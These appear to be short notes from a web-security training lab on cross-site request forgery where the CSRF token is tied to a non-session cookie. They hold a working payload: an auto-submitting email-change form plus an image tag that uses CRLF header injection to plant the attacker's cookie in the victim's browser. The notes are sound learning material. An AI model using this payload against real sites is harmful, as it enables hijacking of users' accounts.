# CSRF Vulnerability

## Let generate some Payloads!

```php
<form method="POST" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
	<input required type="hidden" name="csrf" value="CSRF Of the Attacker">
</form>
<img src="X.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey= csrfKey Of the Attacker" onerror="document.forms[0].submit()">
```

## Takeaway

- some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together
- The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability.

- If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.
	- Observe that if you swap the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted.
	- Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.